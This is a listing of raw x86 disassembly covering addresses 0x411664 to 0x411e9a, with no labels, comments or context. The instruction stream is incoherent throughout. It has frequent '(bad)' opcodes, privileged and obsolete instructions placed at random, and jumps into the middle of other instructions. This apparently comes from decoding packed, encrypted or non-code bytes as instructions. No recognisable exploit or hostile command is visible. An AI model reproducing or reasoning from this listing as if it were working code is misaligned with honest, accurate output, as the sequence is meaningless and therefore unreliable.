  411664:	and    eax,0xfaf28f02
  411669:	jg     0x4116a1
  41166b:	pop    ss
  41166c:	or     al,0x70
  41166e:	loop   0x411675
  411670:	scas   al,BYTE PTR es:[edi]
  411671:	loopne 0x411663
  411673:	(bad)  
  411674:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411675:	xchg   esi,eax
  411676:	leave  
  411677:	and    BYTE PTR [esi],al
  411679:	(bad)  
  41167b:	sbb    BYTE PTR [edx-0x55765ac5],ch
  411681:	jb     0x4116b0
  411683:	sub    ah,BYTE PTR [ebp+ecx*2+0x45dce42b]
  41168a:	xor    BYTE PTR [eax+0x41066054],0xe3
  411691:	sbb    eax,0xa66424d4
  411696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411697:	sbb    BYTE PTR [eax+0x208c5ed],ah
  41169d:	sahf   
  41169e:	mov    ds,WORD PTR [ecx-0x406c2529]
  4116a4:	cmp    bh,0x45
  4116a7:	aam    0x1a
  4116a9:	push   ss
  4116aa:	xchg   ebp,eax
  4116ab:	inc    esp
  4116ac:	push   ebp
  4116ad:	pop    eax
  4116ae:	test   al,0x81
  4116b0:	or     ebp,DWORD PTR [esi]
  4116b2:	jge    0x41166e
  4116b4:	sub    bl,dh
  4116b6:	pop    ebx
  4116b7:	(bad)  
  4116b8:	fcmovnbe st,st(5)
  4116ba:	retf   0xc8e1
  4116bd:	aad    0x17
  4116bf:	sbb    bl,BYTE PTR [ecx-0x6c860ce]
  4116c5:	daa    
  4116c6:	pop    ds
  4116c7:	or     eax,esp
  4116c9:	outs   dx,BYTE PTR ds:[esi]
  4116ca:	test   DWORD PTR [ebx],0x5125ba87
  4116d0:	or     DWORD PTR [ebp+0x34],0xffffffa7
  4116d4:	and    eax,DWORD PTR [esi+0x73]
  4116d7:	retf   0xa078
  4116da:	push   eax
  4116db:	push   eax
  4116dc:	push   edi
  4116dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116de:	leave  
  4116df:	or     DWORD PTR [edi+0x49],edi
  4116e2:	pop    edi
  4116e3:	into   
  4116e4:	cmp    DWORD PTR [ebp+0x53dc85ad],eax
  4116ea:	inc    eax
  4116eb:	stos   BYTE PTR es:[edi],al
  4116ec:	out    dx,eax
  4116ed:	pop    ecx
  4116ee:	ss js  0x4116de
  4116f1:	je     0x4116fe
  4116f3:	scas   eax,DWORD PTR es:[edi]
  4116f4:	adc    ah,bl
  4116f6:	inc    edi
  4116f7:	or     DWORD PTR [ebx+edx*2],esi
  4116fa:	dec    esi
  4116fb:	add    eax,esi
  4116fd:	out    dx,al
  4116fe:	fdivrp st(7),st
  411700:	sar    ebx,1
  411702:	ins    BYTE PTR es:[edi],dx
  411703:	inc    ebp
  411704:	or     al,0x2c
  411706:	rcl    ch,cl
  411708:	cmp    eax,0xfb0624e3
  41170e:	jnp    0x411694
  411710:	fbld   TBYTE PTR [edi]
  411712:	retf   0xcbd
  411715:	ror    DWORD PTR [edi+0x24],0x5a
  411719:	dec    edx
  41171a:	inc    ebp
  41171b:	ins    BYTE PTR es:[edi],dx
  41171c:	inc    di
  41171e:	arpl   WORD PTR [edx+0x1cd0899],sp
  411724:	push   eax
  411725:	(bad)  
  411726:	inc    esi
  411727:	lea    esp,[ebp+0x23]
  41172a:	push   ds
  41172b:	int3   
  41172c:	test   al,0x59
  41172e:	stos   BYTE PTR es:[edi],al
  41172f:	fst    DWORD PTR [ecx]
  411731:	mov    cl,0xf7
  411733:	jmp    0xed1ab595
  411738:	mov    ebp,ebp
  41173a:	pop    ebx
  41173b:	mov    ecx,0xce0abb82
  411740:	cmp    bl,ch
  411742:	jae    0x4117a9
  411744:	call   0x1d11c984
  411749:	(bad)  
  41174a:	xchg   bp,ax
  41174c:	adc    esp,ecx
  41174e:	jl     0x41174c
  411750:	icebp  
  411751:	pop    esi
  411752:	inc    edx
  411753:	(bad)  
  411754:	das    
  411755:	cmp    BYTE PTR [ebx+0x12],ch
  411758:	cmp    ah,BYTE PTR [ecx]
  41175a:	ins    DWORD PTR es:[edi],dx
  41175b:	test   al,0xa5
  41175d:	popf   
  41175e:	cmp    DWORD PTR [ecx-0x7a],edi
  411761:	loope  0x4116ef
  411763:	in     al,dx
  411764:	jp     0x411785
  411766:	sub    eax,0x39e1c4af
  41176b:	xor    DWORD PTR [esi+0x2a],ebx
  41176e:	fmul   QWORD PTR [edi]
  411770:	inc    ecx
  411771:	or     BYTE PTR [ebp-0x60],bl
  411774:	sbb    BYTE PTR [ebx+edx*4-0x2c40d5a6],bh
  41177b:	fadd   st,st(1)
  41177d:	jg     0x411759
  41177f:	sbb    edx,eax
  411781:	scas   eax,DWORD PTR es:[edi]
  411782:	repnz hlt 
  411784:	sub    ebp,esp
  411786:	in     al,0xee
  411788:	mov    cl,0x4
  41178a:	sub    ebx,DWORD PTR [eax+0x5bc61cd9]
  411790:	mov    edx,0x58c0f17f
  411795:	jge    0x411760
  411797:	push   ds
  411798:	jmp    0xa6836030
  41179d:	jae    0x411739
  41179f:	sti    
  4117a0:	mov    ah,0xd2
  4117a2:	clc    
  4117a3:	lock push eax
  4117a5:	fs test edi,ebx
  4117a8:	into   
  4117a9:	icebp  
  4117aa:	inc    ebx
  4117ab:	lock shl BYTE PTR [eax],0x18
  4117af:	ins    DWORD PTR es:[edi],dx
  4117b0:	adc    edx,DWORD PTR [eax+0x45]
  4117b3:	xor    al,BYTE PTR [edx]
  4117b5:	mov    DWORD PTR [esi],esi
  4117b7:	mov    ebx,0xa09dbeb7
  4117bc:	das    
  4117bd:	pop    edi
  4117be:	rcl    BYTE PTR [edi-0xb],1
  4117c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117c2:	push   ebp
  4117c3:	sahf   
  4117c4:	sti    
  4117c5:	js     0x41177b
  4117c7:	adc    al,0xa5
  4117c9:	cmp    al,0x81
  4117cb:	cld    
  4117cc:	gs dec edi
  4117ce:	jae    0x4117cd
  4117d0:	arpl   WORD PTR [eax],di
  4117d2:	sub    ch,ah
  4117d4:	sub    eax,0x9ea58cca
  4117d9:	xchg   ebx,eax
  4117da:	(bad)  
  4117db:	mov    fs,WORD PTR [edi+0x2b677b57]
  4117e1:	(bad)  
  4117e2:	ds pusha 
  4117e4:	adc    al,0xa8
  4117e6:	int    0x9c
  4117e8:	(bad)  
  4117e9:	jmp    0x4117ce
  4117eb:	push   ss
  4117ec:	(bad)  
  4117ed:	cmp    ebp,ebp
  4117ef:	out    dx,eax
  4117f0:	jne    0x4117db
  4117f2:	add    al,0x42
  4117f4:	or     BYTE PTR [esi],0xc8
  4117f7:	mov    eax,ds:0xb75156c8
  4117fc:	inc    esp
  4117fd:	ret    
  4117fe:	loopne 0x4117af
  411800:	xchg   esp,eax
  411801:	dec    esp
  411802:	fnsetpm(287 only) 
  411804:	cs xchg esp,eax
  411806:	xchg   ebp,eax
  411807:	int3   
  411808:	enter  0x6836,0x14
  41180c:	adc    DWORD PTR [eax+0x17],0xffffffc3
  411810:	fs div esp
  411813:	jecxz  0x41183e
  411815:	pushf  
  411816:	add    BYTE PTR [eax],al
  411818:	mov    ecx,0x69c776d7
  41181d:	mov    dx,0xd72d
  411821:	pop    ds
  411822:	jbe    0x41186e
  411824:	push   es
  411825:	cmp    al,0xf5
  411827:	bound  ebp,QWORD PTR [edx]
  411829:	pop    ebp
  41182a:	stos   DWORD PTR es:[edi],eax
  41182b:	mov    esp,0xdf28bb64
  411830:	cs cmp eax,0xf501f843
  411836:	popa   
  411837:	dec    edx
  411838:	and    ecx,DWORD PTR [ebp-0x2e7382a9]
  41183e:	jle    0x41186c
  411840:	rcl    DWORD PTR [ecx+0x50],1
  411843:	and    al,BYTE PTR [ecx-0x82f5cc]
  411849:	inc    esi
  41184a:	cmp    BYTE PTR [esi],al
  41184c:	push   esi
  41184d:	rcr    BYTE PTR [edi-0x26],1
  411850:	inc    esp
  411851:	jp     0x41188e
  411853:	jecxz  0x4117e5
  411855:	add    BYTE PTR [edx+ebx*1-0x627e55e1],dh
  41185c:	enter  0xb456,0x97
  411860:	inc    edi
  411861:	idiv   BYTE PTR [edx-0x80]
  411864:	pop    ecx
  411865:	mov    gs,WORD PTR [edi+0x4b]
  411868:	mov    ah,0x86
  41186a:	adc    al,0x82
  41186c:	push   cs
  41186d:	in     al,0xee
  41186f:	mov    DWORD PTR [edi-0x18],eax
  411872:	into   
  411873:	push   ds
  411874:	and    ebx,ebx
  411876:	sti    
  411877:	adc    DWORD PTR [esi],esp
  411879:	arpl   WORD PTR [eax],di
  41187b:	sub    al,0x18
  41187d:	xchg   DWORD PTR [ecx+0x732c7b6f],esi
  411883:	iret   
  411884:	sub    DWORD PTR [edx+0x5cdb08ba],esp
  41188a:	jnp    0x41183c
  41188c:	sbb    ah,bh
  41188e:	in     eax,0x88
  411890:	or     ebx,ecx
  411892:	call   0x536541e5
  411897:	lods   eax,DWORD PTR ds:[esi]
  411898:	inc    ebx
  411899:	sub    esp,edx
  41189b:	mov    eax,0xf6be0409
  4118a0:	cmp    edx,DWORD PTR [edx+0x5db5d775]
  4118a6:	sub    eax,0x4358f641
  4118ab:	push   0xffffff90
  4118ad:	xchg   esi,eax
  4118ae:	inc    esp
  4118af:	ja     0x411874
  4118b1:	sbb    cl,ch
  4118b3:	jl     0x411889
  4118b5:	mov    ah,0xa6
  4118b7:	inc    edx
  4118b8:	fs mov edx,eax
  4118bb:	jae    0x41189c
  4118bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118be:	xchg   ebp,eax
  4118bf:	dec    edx
  4118c0:	aad    0x50
  4118c2:	neg    DWORD PTR [eax-0x65321f2f]
  4118c8:	adc    DWORD PTR [esi],0xffffffe2
  4118cb:	cmp    eax,0x4df6f77f
  4118d0:	lds    ebx,FWORD PTR [edi+edi*2-0x5b319296]
  4118d7:	mov    eax,ds:0xc9df463e
  4118dc:	pusha  
  4118dd:	fs xchg dl,ch
  4118e0:	sub    al,ch
  4118e2:	sti    
  4118e3:	jecxz  0x41195a
  4118e5:	lock sub al,0x61
  4118e8:	les    ebx,FWORD PTR [ebx+eax*8]
  4118eb:	xor    al,0x21
  4118ed:	mov    al,BYTE PTR [edx-0x39]
  4118f0:	scas   eax,DWORD PTR es:[edi]
  4118f1:	cmp    dh,ch
  4118f3:	fadd   QWORD PTR [ebx+0x6998ad9c]
  4118f9:	fldenv [edx+0x44]
  4118fc:	inc    ecx
  4118fd:	jmp    0x411906
  4118ff:	sbb    eax,0x192c715d
  411904:	cld    
  411905:	push   ebp
  411906:	retf   
  411907:	push   es
  411908:	dec    ebx
  411909:	dec    ecx
  41190a:	mov    ch,0x27
  41190c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41190d:	mov    ecx,0xece03397
  411912:	cli    
  411913:	sbb    BYTE PTR [eax-0x37],dh
  411916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411917:	(bad)  
  411918:	fcmovnb st,st(6)
  41191a:	pushf  
  41191b:	xor    BYTE PTR [edi+ecx*4+0x67],al
  41191f:	sub    ebx,0xffffff8a
  411922:	xlat   BYTE PTR ds:[ebx]
  411923:	arpl   WORD PTR [esi+0x21],cx
  411926:	sub    cl,BYTE PTR [eax]
  411928:	lock (bad) 
  41192a:	mov    ebp,0x430db3ad
  41192f:	popf   
  411930:	xor    edi,esp
  411932:	test   DWORD PTR [esi],edx
  411934:	add    eax,0xbb897003
  411939:	mov    fs,WORD PTR [ebx+0x3ee96c19]
  41193f:	lea    ecx,[ecx]
  411941:	adc    DWORD PTR [edx],0x374b8bea
  411947:	push   cs
  411948:	inc    edx
  411949:	mov    cl,0xd0
  41194b:	and    eax,DWORD PTR [edi]
  41194d:	adc    al,0xf5
  41194f:	fcom   DWORD PTR [esi-0x67]
  411952:	cmp    ecx,DWORD PTR [edx+esi*1-0x30982333]
  411959:	retf   0x4594
  41195c:	mov    esi,0x49e1c3a
  411961:	pop    ss
  411962:	in     al,0xdc
  411964:	js     0x411986
  411966:	pop    edi
  411967:	outs   dx,DWORD PTR ds:[esi]
  411968:	inc    eax
  411969:	mov    gs,WORD PTR [esi-0x191579dd]
  41196f:	add    bh,BYTE PTR [edx]
  411971:	push   edx
  411972:	stc    
  411973:	in     al,dx
  411974:	out    0xb8,al
  411976:	or     ch,BYTE PTR ds:0xe9087766
  41197c:	enter  0xfefa,0xa3
  411980:	pop    esp
  411981:	in     eax,dx
  411982:	gs icebp 
  411984:	repz sbb cl,BYTE PTR fs:[edi+0x22e3e617]
  41198c:	rol    DWORD PTR [ecx+0x42],1
  41198f:	jle    0x411959
  411991:	pop    edi
  411992:	hlt    
  411993:	dec    esp
  411994:	and    eax,0x4cf7ebe6
  411999:	mov    BYTE PTR [esi-0x16],cl
  41199c:	aaa    
  41199d:	clc    
  41199e:	xchg   ebp,eax
  41199f:	pop    edi
  4119a0:	inc    ebx
  4119a1:	mov    ds:0x4c763799,eax
  4119a6:	and    eax,0x1a20fc21
  4119ab:	inc    esp
  4119ac:	aam    0xc0
  4119ae:	adc    edi,DWORD PTR [eax+0x187cf3d3]
  4119b4:	sub    al,0x55
  4119b6:	sub    ebx,DWORD PTR [eax]
  4119b8:	mov    bh,0x69
  4119ba:	stc    
  4119bb:	sbb    DWORD PTR [edi+0x58],esp
  4119be:	dec    ebp
  4119bf:	mov    dh,0xde
  4119c1:	push   esp
  4119c2:	addr16 add eax,0x5558c67b
  4119c8:	add    BYTE PTR [ecx],al
  4119ca:	ret    
  4119cb:	out    0x76,eax
  4119cd:	or     ebp,DWORD PTR [eax-0x15]
  4119d0:	lahf   
  4119d1:	push   0x7f
  4119d3:	int3   
  4119d4:	test   al,0xa9
  4119d6:	cmp    DWORD PTR [esi-0x54],esi
  4119d9:	dec    ecx
  4119da:	ins    BYTE PTR es:[edi],dx
  4119db:	inc    esp
  4119dc:	jae    0x411a45
  4119de:	push   cs
  4119df:	adc    eax,0xa8dee577
  4119e4:	imul   ebp,DWORD PTR [ebp-0x29],0x4f0cddfa
  4119eb:	lea    esi,[ebx+0x3e]
  4119ee:	sub    al,0x73
  4119f0:	ds gs dec ebx
  4119f3:	enter  0x88e3,0xf0
  4119f7:	jae    0x411a2a
  4119f9:	add    al,0xb8
  4119fb:	mov    ebx,0xdf00d77a
  411a00:	div    DWORD PTR [edi+0x23]
  411a03:	jp     0x4119a4
  411a05:	push   ebx
  411a06:	pop    esp
  411a07:	sbb    BYTE PTR [ecx-0x2d],cl
  411a0a:	or     esi,DWORD PTR [eax]
  411a0c:	xor    BYTE PTR [ebp+0x4d],bl
  411a0f:	xor    dl,BYTE PTR [eax+0x3244efab]
  411a15:	xlat   BYTE PTR ds:[ebx]
  411a16:	mov    ch,0xfd
  411a18:	jns    0x411a65
  411a1a:	rcl    BYTE PTR [edi-0x3a],1
  411a1d:	mov    dh,0x45
  411a1f:	push   0x5ca77f1f
  411a24:	pop    esi
  411a25:	in     al,0x92
  411a27:	not    DWORD PTR [ebp+0x14a4cadd]
  411a2d:	enter  0x1cdb,0xa8
  411a31:	mov    bh,0xae
  411a33:	push   edx
  411a34:	fwait
  411a35:	mov    bh,cl
  411a37:	lds    edx,FWORD PTR [esi-0x11129762]
  411a3d:	xor    eax,0x3e011ef7
  411a42:	add    ah,dh
  411a44:	xchg   BYTE PTR [ebx],dh
  411a46:	dec    eax
  411a47:	adc    eax,0xb4cd3f1b
  411a4c:	sub    BYTE PTR [eax+edi*1-0x7e],ch
  411a50:	ins    BYTE PTR es:[edi],dx
  411a51:	fisub  DWORD PTR [ebx+0x13ad652a]
  411a57:	div    DWORD PTR [edi+ecx*2]
  411a5a:	outs   dx,DWORD PTR gs:[esi]
  411a5c:	or     DWORD PTR [ecx+0xe141cae],edx
  411a62:	call   0x37b464f6
  411a67:	xor    edi,DWORD PTR [edx*1-0x155ef3be]
  411a6e:	cmp    DWORD PTR [ecx+esi*8-0x79390c3e],eax
  411a75:	adc    al,0x7e
  411a77:	inc    edi
  411a78:	mov    BYTE PTR [eax],bh
  411a7a:	inc    edi
  411a7b:	ret    0x1df5
  411a7e:	jmp    0x411a03
  411a80:	clc    
  411a81:	mov    edi,0xbc2c93d2
  411a86:	dec    edi
  411a87:	sahf   
  411a88:	sahf   
  411a89:	adc    BYTE PTR [edx],ah
  411a8b:	fbld   TBYTE PTR es:[ecx]
  411a8e:	stos   BYTE PTR es:[edi],al
  411a8f:	xchg   esp,eax
  411a90:	jge    0x411a93
  411a92:	pop    esp
  411a93:	cmc    
  411a94:	mov    BYTE PTR [edi-0x5bf6f1d9],dl
  411a9a:	xchg   ebp,eax
  411a9b:	test   DWORD PTR [ecx-0x1d6d41d6],ecx
  411aa1:	mov    ds:0x2c272f8e,al
  411aa6:	xor    al,0x65
  411aa8:	push   edi
  411aa9:	popf   
  411aaa:	ror    DWORD PTR [ebp-0x16],1
  411aad:	js     0x411af8
  411aaf:	pushf  
  411ab0:	ficom  WORD PTR [esi]
  411ab2:	out    0x4e,al
  411ab4:	mov    WORD PTR [edx+edx*4-0x57b0659f],ss
  411abb:	dec    eax
  411abc:	mov    dl,0xf5
  411abe:	int    0x28
  411ac0:	mov    cl,0xd3
  411ac2:	xchg   ebp,eax
  411ac3:	mov    DWORD PTR [edx],esi
  411ac5:	(bad)  
  411ac7:	pop    es
  411ac8:	mov    edi,0xd16fa457
  411acd:	push   eax
  411ace:	(bad)  
  411acf:	mov    WORD PTR cs:[ebp+0x15c53d74],fs
  411ad6:	ins    BYTE PTR es:[edi],dx
  411ad7:	adc    esi,DWORD PTR [eax-0x6]
  411ada:	das    
  411adb:	push   cs
  411adc:	stos   BYTE PTR es:[edi],al
  411add:	(bad)  [eax+0x27]
  411ae0:	aaa    
  411ae1:	mov    al,0x9a
  411ae3:	sbb    al,0xbd
  411ae5:	and    BYTE PTR [edx+ecx*4-0x45],0xad
  411aea:	push   ebp
  411aeb:	xor    DWORD PTR [edx-0x46],ebp
  411aee:	adc    eax,0xd39d8390
  411af3:	mov    al,0x22
  411af5:	ret    0x9e4d
  411af8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411af9:	mov    ebp,0xd2c73f51
  411afe:	div    edi
  411b00:	push   edi
  411b01:	repnz stos DWORD PTR es:[edi],eax
  411b03:	fs inc ebx
  411b05:	gs leave 
  411b07:	test   al,0x4d
  411b09:	cs jp  0x411b70
  411b0c:	cmp    BYTE PTR [esi-0x786c2a51],bh
  411b12:	xor    BYTE PTR [edi-0x375eb839],bl
  411b18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b19:	pop    esp
  411b1a:	retf   0xc471
  411b1d:	js     0x411abc
  411b1f:	jo     0x411ab0
  411b21:	repz push esp
  411b23:	xor    eax,0x3d356fb
  411b28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b29:	jmp    0x411af1
  411b2b:	adc    ebp,ebp
  411b2d:	sbb    ah,BYTE PTR [ecx+esi*1-0x71]
  411b31:	push   cs
  411b32:	pop    ebx
  411b33:	shl    BYTE PTR [ebp-0x3c954a0],0x62
  411b3a:	pop    ds
  411b3b:	sbb    bh,BYTE PTR [edx]
  411b3d:	cmp    edi,0xffffff8c
  411b40:	pop    edi
  411b41:	xor    cl,dl
  411b43:	dec    esp
  411b44:	imul   esp,eax,0x9c608273
  411b4a:	lea    ecx,ds:[ebp+0x52]
  411b4e:	inc    eax
  411b4f:	or     eax,0x65690003
  411b54:	sbb    edx,DWORD PTR [esi+0x480b674c]
  411b5a:	sti    
  411b5b:	mov    edi,0xcf20008f
  411b60:	neg    ch
  411b62:	jae    0x411b0f
  411b64:	enter  0x5e04,0x2e
  411b68:	mov    bl,0x86
  411b6a:	dec    edx
  411b6b:	repnz pop esp
  411b6d:	imul   ebx,DWORD PTR [eax-0x42],0x2fefab74
  411b74:	xchg   BYTE PTR [eax+0x22c8ec71],bh
  411b7a:	inc    esi
  411b7b:	pop    edi
  411b7c:	jle    0x411ba1
  411b7e:	fistp  QWORD PTR [esi-0x144d3124]
  411b84:	retf   
  411b85:	mov    eax,ds:0x84cfb285
  411b8a:	mov    ebx,0x8e20f75b
  411b8f:	xchg   ebx,eax
  411b90:	push   esp
  411b91:	xor    BYTE PTR [ebx+ebp*4+0x34a1d846],0x55
  411b99:	jns    0x411bc5
  411b9b:	aam    0x85
  411b9d:	shr    BYTE PTR [ebx],0x9c
  411ba0:	push   ebx
  411ba1:	pop    es
  411ba2:	rcl    DWORD PTR [edi+0x18],0x67
  411ba6:	test   BYTE PTR [ebx-0x3f],0x9c
  411baa:	sub    al,0x70
  411bac:	mov    BYTE PTR [esi-0x4fa5dfdf],cl
  411bb2:	fdiv   QWORD PTR [esi+0x3b]
  411bb5:	rcl    BYTE PTR [edx-0x32c31a4],cl
  411bbb:	cmp    BYTE PTR [esi+0x29],cl
  411bbe:	hlt    
  411bbf:	or     eax,0x9f3b0a73
  411bc4:	jne    0x411bf8
  411bc6:	or     eax,0x582db756
  411bcb:	mov    ch,0xb4
  411bcd:	mov    al,ds:0x5e97a61
  411bd2:	pop    ds
  411bd3:	imul   esp,DWORD PTR [eax+edi*1-0x5ebefb49],0x27637b57
  411bde:	loopne 0x411c01
  411be0:	push   ds
  411be1:	mov    al,0xe1
  411be3:	jmp    0x2beb:0xef1b1217
  411bea:	sub    edi,DWORD PTR [esi+ebx*8]
  411bed:	or     bh,BYTE PTR [edi+0x71]
  411bf0:	sbb    DWORD PTR cs:[ecx-0x7b6de8b],0xffffffa7
  411bf8:	adc    eax,0xb382f39c
  411bfd:	je     0x411c3d
  411bff:	cwde   
  411c00:	cmp    ah,0x8b
  411c03:	jo     0x411c27
  411c05:	int3   
  411c06:	jb     0x411c82
  411c08:	icebp  
  411c09:	popf   
  411c0a:	and    DWORD PTR [ecx],0xffffffc5
  411c0d:	rcl    esi,1
  411c0f:	push   esp
  411c10:	outs   dx,DWORD PTR ds:[esi]
  411c11:	sti    
  411c12:	mov    al,0x17
  411c14:	or     bh,cl
  411c16:	imul   ecx,DWORD PTR [ebx],0xc75836a8
  411c1c:	ficomp DWORD PTR [edi]
  411c1e:	jg     0x411be7
  411c20:	push   cs
  411c21:	add    ebx,esi
  411c23:	(bad)  
  411c24:	jnp    0x411c14
  411c26:	iret   
  411c27:	adc    al,0x1a
  411c29:	jle    0x411bf7
  411c2b:	inc    edx
  411c2c:	fild   QWORD PTR [ecx+0x12]
  411c2f:	outs   dx,DWORD PTR ds:[esi]
  411c30:	sbb    edx,DWORD PTR [edx+0x2f]
  411c33:	jl     0x411c6b
  411c35:	or     ah,BYTE PTR [ebx-0x1f]
  411c38:	inc    ecx
  411c39:	xor    ebp,ebx
  411c3b:	xor    eax,0x5c71ffec
  411c40:	xor    BYTE PTR [ecx-0x7],ch
  411c43:	pop    ebx
  411c44:	dec    BYTE PTR [ebp+0x7b32398f]
  411c4a:	xlat   BYTE PTR ds:[ebx]
  411c4b:	call   0x3839:0xfffaa6c9
  411c52:	stos   DWORD PTR es:[edi],eax
  411c53:	(bad)  
  411c55:	jecxz  0x411bd8
  411c57:	or     DWORD PTR [esi+0x3b],0x74
  411c5b:	xor    al,0x20
  411c5d:	das    
  411c5e:	imul   esi,esi,0xffffffbb
  411c61:	add    ah,BYTE PTR [ebp-0x1f]
  411c64:	xor    al,cl
  411c66:	(bad)  
  411c67:	jmp    0x411ca6
  411c69:	push   esp
  411c6a:	sub    eax,0x387328f6
  411c6f:	jnp    0x411c20
  411c71:	inc    ebp
  411c72:	or     eax,0x6d593d5b
  411c77:	icebp  
  411c78:	and    eax,ecx
  411c7a:	cli    
  411c7b:	aaa    
  411c7c:	dec    edx
  411c7d:	pusha  
  411c7e:	sti    
  411c7f:	jge    0x411ccd
  411c81:	stos   DWORD PTR es:[edi],eax
  411c82:	sub    dl,BYTE PTR [eax]
  411c84:	mov    cl,0x4e
  411c86:	scas   eax,DWORD PTR es:[edi]
  411c87:	sbb    bl,0x9d
  411c8a:	push   DWORD PTR [esi+0x5b]
  411c8d:	or     eax,0x2011264e
  411c92:	inc    ebx
  411c93:	mov    al,0x4a
	...
  411d11:	add    BYTE PTR [eax],al
  411d13:	add    BYTE PTR [ecx],ch
  411d15:	pop    edx
  411d16:	inc    ecx
  411d17:	sbb    dh,BYTE PTR [ebx+0x1b]
  411d1a:	jnp    0x411d97
  411d1c:	retf   0x5bc8
  411d1f:	nop
  411d20:	jmp    0x769e25fd
  411d25:	mov    BYTE PTR [eax],0x0
  411d28:	imul   eax,DWORD PTR [edi],0xedd0000
  411d2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d2f:	add    BYTE PTR [ebp+0x21713a66],0x26
  411d36:	dec    ebp
  411d37:	ss ins BYTE PTR es:[edi],dx
  411d39:	(bad)  
  411d3a:	stos   DWORD PTR es:[edi],eax
  411d3b:	push   ecx
  411d3c:	mov    ebp,0x12722d9d
  411d41:	dec    ebp
  411d42:	mov    eax,ds:0x512afc5
  411d47:	(bad)
  411d4c:	and    eax,0x34dd8b01
  411d51:	push   es
  411d52:	sub    DWORD PTR [edi+0x831ace7],eax
  411d58:	cmp    dl,BYTE PTR [ecx]
  411d5a:	ins    BYTE PTR es:[edi],dx
  411d5b:	repz clc 
  411d5d:	fld    TBYTE PTR [ebx-0x56d295bb]
  411d63:	in     al,0xcc
  411d65:	push   edx
  411d66:	test   eax,0x67ecbed9
  411d6b:	push   ss
  411d6c:	mov    cl,0x21
  411d6e:	mov    bl,0x35
  411d70:	and    BYTE PTR [ecx-0x70b76002],al
  411d76:	sahf   
  411d77:	pop    ss
  411d78:	mov    ds,ecx
  411d7a:	jns    0x411d52
  411d7c:	xchg   ch,bh
  411d7e:	and    eax,0x1350d392
  411d83:	mov    ss,WORD PTR [edx-0x80]
  411d86:	(bad)  
  411d87:	cld    
  411d88:	xchg   ebp,edx
  411d8a:	add    eax,0x5932cdba
  411d8f:	cwde   
  411d90:	popa   
  411d91:	icebp  
  411d92:	dec    eax
  411d93:	cmp    BYTE PTR ds:0x1eb38605,cl
  411d99:	cmp    DWORD PTR [edx-0x13],0x7985117e
  411da0:	sub    eax,0xd9d5f602
  411da5:	add    al,0x2c
  411da7:	addr16 cmp al,0xbf
  411daa:	int3   
  411dab:	adc    dh,dl
  411dad:	adc    al,ch
  411daf:	jge    0x411d9d
  411db1:	push   ds
  411db2:	pop    esi
  411db3:	and    ebx,eax
  411db5:	mov    esi,0xc9f96d65
  411dba:	or     BYTE PTR [eax-0x5705f879],bh
  411dc0:	push   esi
  411dc1:	mov    eax,0x2c8757bc
  411dc6:	inc    esp
  411dc7:	in     eax,0xf0
  411dc9:	pop    ebx
  411dca:	cli    
  411dcb:	or     ebp,DWORD PTR [esi]
  411dcd:	(bad)
  411dd0:	icebp  
  411dd1:	repz iret 
  411dd3:	dec    esp
  411dd4:	and    ebx,DWORD PTR [edx]
  411dd6:	pop    ecx
  411dd8:	jmp    0x626e4063
  411ddd:	jge    0x411d67
  411ddf:	imul   ebp,DWORD PTR [ebp+0x3364fdad],0x878d1def
  411de9:	cmp    edi,DWORD PTR [ebx-0x5e]
  411dec:	pop    ss
  411ded:	and    DWORD PTR [esi],edi
  411def:	xchg   esp,eax
  411df0:	jp     0x411dad
  411df2:	push   edi
  411df3:	pushf  
  411df4:	in     eax,dx
  411df5:	inc    ecx
  411df6:	add    eax,DWORD PTR [ebp+esi*2+0xaf48285]
  411dfd:	dec    esi
  411dfe:	lds    edi,FWORD PTR [esi+0x14]
  411e01:	cdq    
  411e02:	or     BYTE PTR [ebx+ebx*8],al
  411e05:	(bad)  
  411e06:	mov    gs,WORD PTR [ebp+eax*4+0x6a9a3238]
  411e0d:	add    al,0xd0
  411e0f:	cdq    
  411e10:	and    DWORD PTR [ebx],ebp
  411e12:	neg    BYTE PTR [ebx+0xd5d15c0]
  411e18:	jb     0x411e1a
  411e1a:	dec    ebp
  411e1b:	add    eax,ebx
  411e1d:	pop    esi
  411e1e:	xchg   BYTE PTR [edi],dh
  411e20:	push   ss
  411e21:	pop    ss
  411e22:	cs lahf 
  411e24:	cld    
  411e25:	or     BYTE PTR [edi],cl
  411e27:	push   ds
  411e28:	test   eax,0x98e22caf
  411e2d:	mov    bl,ch
  411e2f:	jae    0x411e27
  411e31:	(bad)  
  411e32:	sub    eax,0x78733d2b
  411e37:	mov    es,ebx
  411e39:	cmp    DWORD PTR [ebx-0x36],ebx
  411e3c:	pusha  
  411e3d:	xchg   bh,dh
  411e3f:	xchg   esp,eax
  411e40:	push   ss
  411e41:	mov    al,ds:0x65342c3f
  411e46:	mov    ecx,0xa5dd7795
  411e4b:	xor    eax,0x1348679f
  411e50:	cmp    bl,BYTE PTR [edi+ecx*1]
  411e53:	out    0xd5,eax
  411e55:	sub    BYTE PTR [eax],cl
  411e57:	(bad)  
  411e58:	mov    ebp,0xe6837659
  411e5d:	mov    cl,0x43
  411e5f:	dec    eax
  411e60:	sub    DWORD PTR [ecx],ecx
  411e62:	mov    DWORD PTR [ebx],esp
  411e64:	loopne 0x411ed8
  411e66:	and    dh,BYTE PTR [esi+edi*4+0x67b758b2]
  411e6d:	stc    
  411e6e:	call   0x627d01a1
  411e73:	and    edi,DWORD PTR [eax+0x1a9968b]
  411e79:	jle    0x411ec5
  411e7b:	mov    bh,0x96
  411e7d:	sbb    ah,ah
  411e7f:	ja     0x411e27
  411e81:	das    
  411e82:	sbb    eax,edx
  411e84:	inc    ecx
  411e85:	mov    esp,0x267c91f1
  411e8a:	cli    
  411e8b:	xor    ebx,DWORD PTR [ebp-0x14]
  411e8e:	jmp    0x8ea6088b
  411e93:	addr16 mov ds:0xcb0,eax
  411e97:	inc    ebp
  411e98:	or     al,0xd8
  411e9a:	mov    ds:0xee742cf,eax
